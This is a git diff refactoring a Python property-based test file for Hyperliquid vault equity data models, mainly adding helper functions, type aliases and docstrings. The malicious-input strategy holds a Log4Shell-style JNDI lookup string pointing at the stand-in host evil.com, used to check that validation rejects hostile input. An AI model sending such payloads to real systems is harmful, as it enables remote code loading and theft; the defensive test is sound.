@@ -1,7 +1,7 @@
 """Property-based tests for Hyperliquid raw user vault equity models.
 
 These tests validate critical security boundary models that process external vault equity data.
-The models tested here are essential for vault equity tracking, balance management, and financial reporting.
+The models tested here are essential for vault equity tracking, balance management, etc.
 
 SECURITY CRITICAL: These raw models protect against:
 - Malicious vault equity data that could manipulate balance information
@@ -31,13 +31,36 @@ from cyberdelta.exceptions.field_validation import TypeFieldError
 from cyberdelta.exceptions.parsing import EmptyStringError
 
 
+# Type alias for malicious input types to avoid long lines
+MaliciousInput = str | int | float | bool | list[str] | dict[str, str] | bytes | None
+
+
+# =============================================================================
+# HELPER FUNCTIONS FOR STRATEGY BUILDERS
+# =============================================================================
+
+
+def _build_hex_address(hex_part: str) -> str:
+    """Build hex address with 0x prefix."""
+    return f"0x{hex_part}"
+
+
+def _build_address_with_prefix(prefix: str, hex_part: str) -> str:
+    """Build address with custom prefix."""
+    return f"{prefix}{hex_part}"
+
+
 # =============================================================================
 # HYPOTHESIS STRATEGIES FOR USER VAULT EQUITY MODEL TESTING
 # =============================================================================
 
 
 def valid_ethereum_address_strategy() -> SearchStrategy[str]:
-    """Generate valid Ethereum addresses for vault addresses."""
+    """Generate valid Ethereum addresses for vault addresses.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Known valid vault addresses
         st.sampled_from([
@@ -50,14 +73,18 @@ def valid_ethereum_address_strategy() -> SearchStrategy[str]:
         ]),
         # Generated valid addresses
         st.builds(
-            lambda hex_part: f"0x{hex_part}",
+            _build_hex_address,
             st.text(min_size=40, max_size=40, alphabet=string.hexdigits),
         ),
     ])
 
 
 def invalid_ethereum_address_strategy() -> SearchStrategy[str]:
-    """Generate invalid Ethereum address strings."""
+    """Generate invalid Ethereum address strings.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Wrong length
         st.text(min_size=1, max_size=39, alphabet=string.hexdigits),
@@ -66,13 +93,13 @@ def invalid_ethereum_address_strategy() -> SearchStrategy[str]:
         st.text(min_size=40, max_size=40, alphabet=string.hexdigits),
         # Wrong prefix
         st.builds(
-            lambda prefix, hex_part: f"{prefix}{hex_part}",
+            _build_address_with_prefix,
             st.sampled_from(["0X", "1x", "x", "00x", ""]),
             st.text(min_size=40, max_size=40, alphabet=string.hexdigits),
         ),
         # Invalid characters
         st.builds(
-            lambda hex_part: f"0x{hex_part}",
+            _build_hex_address,
             st.text(
                 min_size=40,
                 max_size=40,
@@ -88,7 +115,11 @@ def invalid_ethereum_address_strategy() -> SearchStrategy[str]:
 
 
 def financial_decimal_string_strategy() -> SearchStrategy[str]:
-    """Generate valid decimal strings for financial equity amounts."""
+    """Generate valid decimal strings for financial equity amounts.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Common equity values
         st.decimals(
@@ -112,7 +143,11 @@ def financial_decimal_string_strategy() -> SearchStrategy[str]:
 
 
 def invalid_decimal_string_strategy() -> SearchStrategy[str]:
-    """Generate invalid decimal strings."""
+    """Generate invalid decimal strings.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Non-finite values
         st.just("NaN"),
@@ -133,15 +168,23 @@ def invalid_decimal_string_strategy() -> SearchStrategy[str]:
 
 @st.composite
 def valid_vault_equity_item_strategy(draw: st.DrawFn) -> dict[str, Any]:
-    """Generate valid vault equity item data."""
+    """Generate valid vault equity item data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
     return {
         "vaultAddress": draw(valid_ethereum_address_strategy()),
         "equity": draw(financial_decimal_string_strategy()),
     }
 
 
-def malicious_vault_equity_strategy() -> SearchStrategy[Any]:
-    """Generate malicious values for vault equity security testing."""
+def malicious_vault_equity_strategy() -> SearchStrategy[MaliciousInput]:
+    """Generate malicious values for vault equity security testing.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Vault equity manipulation attempts
         st.just("${jndi:ldap://evil.com/steal-vault-equity}"),
@@ -193,7 +236,7 @@ class TestHyperliquidRawUserVaultEquityItemProperties:
     def test_vault_equity_item_validation_success_properties(
         self, item_data: dict[str, Any]
     ) -> None:
-        """Property: Valid vault equity item data should always create valid objects."""
+        """Property: Valid data should create valid objects."""
         # Skip invalid data
         try:
             # Validate vault address
@@ -230,10 +273,10 @@ class TestHyperliquidRawUserVaultEquityItemProperties:
         malicious_value=malicious_vault_equity_strategy(),
     )
     def test_vault_equity_item_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: MaliciousInput
     ) -> None:
-        """Property: Vault equity item model should reject malicious inputs safely."""
-        base_data = {
+        """Property: Vault equity item model should reject malicious inputs."""
+        base_data: dict[str, object] = {
             "vaultAddress": "0xdfc24b077bc1425ad1dea75bcb6f8158e10df303",
             "equity": "742500.082809",
         }
@@ -349,7 +392,7 @@ class TestHyperliquidRawUserVaultEquityItemProperties:
         # Skip invalid data
         try:
             assume(len(valid_address) == 42 and valid_address.startswith("0x"))
-            assume(isinstance(valid_equity, str) and valid_equity.strip())
+            assume(valid_equity.strip())
             decimal_val = Decimal(valid_equity)
             assume(decimal_val.is_finite() and decimal_val >= 0)
         except (ValueError, TypeError, IndexError):
@@ -428,10 +471,10 @@ class TestHyperliquidRawUserVaultEquityIntegrationProperties:
         malicious_value=malicious_vault_equity_strategy(),
     )
     def test_vault_equity_batch_processing_properties(
-        self, vault_items: list[dict[str, Any]], malicious_value: Any
+        self, vault_items: list[dict[str, Any]], malicious_value: MaliciousInput
     ) -> None:
         """Property: Multiple vault equity items should be processed independently."""
-        valid_items = []
+        valid_items: list[HyperliquidRawUserVaultEquityItem] = []
 
         for item_data in vault_items:
             # Skip invalid items
@@ -487,7 +530,7 @@ class TestHyperliquidRawUserVaultEquityIntegrationProperties:
     def test_vault_equity_adversarial_input_properties(
         self, complete_malicious_data: dict[str, Any]
     ) -> None:
-        """Property: Vault equity model should safely handle complete adversarial input."""
+        """Property: Vault equity model should handle adversarial input safely."""
         # Property: Complete adversarial input should be safely rejected
         with pytest.raises((ValidationError, TypeError)):
             HyperliquidRawUserVaultEquityItem.model_validate(complete_malicious_data)
